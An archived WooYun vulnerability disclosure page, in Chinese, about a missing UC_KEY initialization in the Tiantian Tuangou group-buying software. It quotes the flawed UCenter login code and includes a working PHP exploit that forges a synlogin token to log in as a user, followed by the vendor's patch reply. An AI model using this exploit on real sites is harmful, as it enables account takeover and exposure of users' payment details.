@@ -1,0 +1,262 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		天天团购UC_KEY未初始化安全隐患  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		天天团购UC_KEY未初始化安全隐患  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/牛奶坦克">牛奶坦克</a> 
+</li><li>提交时间：		2012-03-01 20:13</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-03-01：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-03-02：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-03-12：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-03-22：	细节向普通白帽子公开<br/>
+									2012-04-01：	细节向实习白帽子公开<br/>
+									2012-04-15：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">天天团购集成了ucenter一站式登录api,但是UC_key未初始化将导致攻击者可以登录任意帐号,甚至操作信用卡信息.</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail"></p><pre><code>$get = $post = array();<br />
+<br />
+	$code = @$_GET[&#039;code&#039;];							//获取token<br />
+	parse_str(_authcode($code, &#039;DECODE&#039;, UC_KEY), $get);		//UC_KEY未经初始化的情况下会为空<br />
+	if(MAGIC_QUOTES_GPC) {<br />
+		$get = _stripslashes($get);						//哟嗬?<br />
+	}<br />
+	<br />
+	$timestamp = time();<br />
+	if(empty($get)) {<br />
+		exit(&#039;Invalid Request&#039;);<br />
+	} elseif($timestamp - $get[&#039;time&#039;] &gt; 3600) {				//如果token中的时间戳有效期不足一小时则不允许登录<br />
+		exit(&#039;Authracation has expiried&#039;);<br />
+	}<br />
+	$action = $get[&#039;action&#039;];<br />
+... ...<br />
+	if(in_array($get[&#039;action&#039;], array(&#039;test&#039;, &#039;deleteuser&#039;, &#039;renameuser&#039;, &#039;gettag&#039;, &#039;synlogin&#039;, &#039;synlogout&#039;, &#039;updatepw&#039;, &#039;updatebadwords&#039;, &#039;updatehosts&#039;, &#039;updateapps&#039;, &#039;updateclient&#039;, &#039;updatecredit&#039;, &#039;getcredit&#039;, &#039;getcreditsettings&#039;, &#039;updatecreditsettings&#039;))) {	//定义了几个操作接口,其中,恩,有很多好玩的东西<br />
+... ...<br />
+	function synlogin($get, $post) {						//登录接口<br />
+		$uid = (int) $get[&#039;uid&#039;];						//需要两个参数,uid和username<br />
+		$username = $get[&#039;username&#039;];<br />
+		... ...	<br />
+		$query = $this-&gt;db-&gt;query(&quot;SELECT uid, password, secques FROM {$this-&gt;tablepre}system_members WHERE ucuid=&#039;$uid&#039;&quot;);		//这里传递的不是数据库内的uid,而是ucuid,这里初始都是0的,但是这里又写的很糙,username根本没进入查询流程,也就是说只能登录第一个账户<br />
+		$UserFields = $this-&gt;db-&gt;fetch_array($query);<br />
+		if (!$UserFields) {<br />
+			;<br />
+		}<br />
+		if($UserFields) {	<br />
+			$auth = TTTuangouAuthcode(&quot;{$UserFields[&#039;password&#039;]}\t{$UserFields[&#039;secques&#039;]}\t{$UserFields[&#039;uid&#039;]}&quot;);		//取出用户信息后直接站内登录<br />
+			<br />
+			_setcookie(&#039;sid&#039;, &#039;&#039;, -86400 * 365);<br />
+			_setcookie(&#039;auth&#039;,$auth,(365*86400));<br />
+			_setcookie(&#039;cookietime&#039;,&#039;2592000&#039;,(365*86400));<br />
+		... ...</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+UC_KEY未初始化为空,所以也就等于别人知道了你的UC_KEY,可直接进行操作,像一些应用初始化为123456其实一样可笑,下了你的源码看一眼不就又知道了? </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><pre><code>Exp:<br />
+&lt;?php<br />
+error_reporting(0);<br />
+$username = $argv[1];<br />
+$key = &#039;&#039;;<br />
+<br />
+$code = &#039;time=1356796800&amp;username=&#039;.$username.&#039;&amp;uid=0&amp;action=synlogin&#039;;<br />
+echo &quot;$code\n&quot;;<br />
+$exp = urlencode(authcode($code, &quot;ENCODE&quot;, $key));<br />
+print_r(&#039;/api/uc.php?code=&#039;.$exp);<br />
+<br />
+function authcode($string, $operation = &#039;DECODE&#039;, $key = &#039;&#039;, $expiry = 0) {<br />
+ <br />
+    $ckey_length = 4;<br />
+ <br />
+    $key = md5($key ? $key : UC_KEY);<br />
+    $keya = md5(substr($key, 0, 16));<br />
+    $keyb = md5(substr($key, 16, 16));<br />
+    $keyc = $ckey_length ? ($operation == &#039;DECODE&#039; ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : &#039;&#039;;<br />
+ <br />
+    $cryptkey = $keya.md5($keya.$keyc);<br />
+    $key_length = strlen($cryptkey);<br />
+ <br />
+    $string = $operation == &#039;DECODE&#039; ? base64_decode(substr($string, $ckey_length)) : sprintf(&#039;%010d&#039;, $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;<br />
+    $string_length = strlen($string);<br />
+ <br />
+    $result = &#039;&#039;;<br />
+    $box = range(0, 255);<br />
+ <br />
+    $rndkey = array();<br />
+    for($i = 0; $i &lt;= 255; $i++) {<br />
+        $rndkey[$i] = ord($cryptkey[$i % $key_length]);<br />
+    }<br />
+ <br />
+    for($j = $i = 0; $i &lt; 256; $i++) {<br />
+        $j = ($j + $box[$i] + $rndkey[$i]) % 256;<br />
+        $tmp = $box[$i];<br />
+        $box[$i] = $box[$j];<br />
+        $box[$j] = $tmp;<br />
+    }<br />
+ <br />
+    for($a = $j = $i = 0; $i &lt; $string_length; $i++) {<br />
+        $a = ($a + 1) % 256;<br />
+        $j = ($j + $box[$a]) % 256;<br />
+        $tmp = $box[$a];<br />
+        $box[$a] = $box[$j];<br />
+        $box[$j] = $tmp;<br />
+        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));<br />
+    }<br />
+ <br />
+    if($operation == &#039;DECODE&#039;) {<br />
+        if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {<br />
+            return substr($result, 26);<br />
+        } else {<br />
+            return &#039;&#039;;<br />
+        }<br />
+    } else {<br />
+        return $keyc.str_replace(&#039;=&#039;, &#039;&#039;, base64_encode($result));<br />
+    }<br />
+ <br />
+}</code></pre><p class='detail'> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">需要在安装过程就给予正确的引导,比如设置自己的key或者禁用uc_client功能等. </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/牛奶坦克" title="牛奶坦克">牛奶坦克</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-04951" title="天天团购UC_KEY未初始化安全隐患">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2012-03-02 18:57</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢提供，是ucenter模块配置初始化漏洞，使用者整合了ucenter就相对来说安全些，已经发布补丁更新相关程序下载。<br />
+补丁详见：http://cenwor.com/thread-12826-1-1.html</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="4951";
+var bugRating="-3";
+var myRating="";
+var ratingCount="1";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
